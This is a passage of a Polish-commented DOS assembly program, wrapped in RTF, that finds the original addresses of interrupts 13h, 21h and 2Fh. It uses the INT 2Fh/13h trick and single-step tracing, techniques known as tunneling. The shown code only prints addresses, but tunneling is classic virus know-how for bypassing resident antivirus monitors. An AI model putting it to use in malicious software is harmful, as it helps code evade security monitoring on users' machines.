\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   - 13h (trik 2F/13, tryb krokowy)                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   - 21h (tablica stalych adresow, tryb krokowy, tuneling rekursywny)       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   - 2Fh (tablica stalych adresow)                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     TUNEL.ASM                                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t TUNEL.OBJ                                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NUL = 00h                               ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LF  = 0Ah                               ;  - stale potrzebne do deklaracji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CR  = 0Dh                               ; /  lancuchow napisowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ON  = 001h                              ; \\ stale potrzebne do obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OFF = 002h                              ; / przerwania 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PROG segment                            ; segment kodu i danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ORG 100h                                ; program jest typu COM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Assume CS:PROG, DS:PROG, ES:PROG, SS:PROG}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CodeStart:                              ; tu zaczyna sie program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeCopyRight          ; \\ pokaz info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call GetOriginal13           ; pokaz oryginalny adres 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call GetOriginal21           ; pokaz oryginalny adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call GetOriginal2F           ; pokaz oryginalny adres 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax, 4C00h               ; \\ koncz program i powroc do DOSa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal13  proc near                ; procedura pobiera oryginalny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; Int 13h (na dwa sposoby) i wyswietla}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeGet13              ; \\ pokaz info o przerwaniu 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Trik2F13                ; wez adres 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metoda Trik 2F/13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Tracing13               ; wez adres 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metoda tracingu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call ShowAddr                ; pokaz adres 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetOriginal13  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik2F13 proc near                      ; procedura pobiera oryginalny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; Int 13h wykorzystujac funkcje 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; przerwania 2Fh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; (wewnetrzna funkcja DOS)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ds                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;   \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push dx                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeTrik2F13           ; \\ pokaz info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; / Trik 2F/13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,13h                  ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  2Fh                     ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowSeg,es           ;    \\ trik 2F/13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowOFS,bx           ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,13h                  ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  2Fh                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  dx                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ;   \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ds                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Trik2F13 endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracing13 proc near                     ; procedura popbiera oryginalny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; adres Int 13h, wykorzystujac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metode tracingu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ds                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;   \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push cx                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push dx                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeTracingFail}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeTracing13          ; \\ wyswietl info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,8                    ; \\   pobierz info o twardym dysku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  dl,80h                  ;  \\  i zachowaj na pozniej wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  13h                     ;   / rejestrow CX i DX; beda one}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  MagicNum1,cx            ;  /  potrzebne do sprawdzenia czy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  MagicNum2,dx            ; /   tracer jest juz w dobrym kodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,3513h                ; \\   wez adres przerwania Int 13h,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ;  \\  zeby mozna je bylo przetrace'owac,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  CallFarSeg,es           ;  /  trzeba je emulowac poprzez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  CallFarOfs,bx           ; /   pushf/call dword ptr Ofs:Seg}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,OFF           ; flaga potrzebna tracerowi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,3501h                ; \\    pobierz adres obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ;  \\   przerwania krokowego Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  of1,bx                  ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  se1,es                  ;    \\ i ustaw nowa procedure jego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;    - obslugi, sprawdzajaca, czy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  dx,offset Tracer_13     ;   /  funkcja zostala juz wykonana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,2501h                ;  /   przez BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; \\    wlacz tryb krokowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop ax                       ;  \\   procesora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or ah,1                      ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            popf                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  dl,80h                  ; parametr funkcji 08/int 13h = HD0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,08h                  ; numer funkcji BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; czesc emulacji Int 13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,ON            ; wlacz flage tracera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call dword ptr cs:IntAsFarCall}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; emuluj int 13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,OFF           ; wylacz flage tracera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
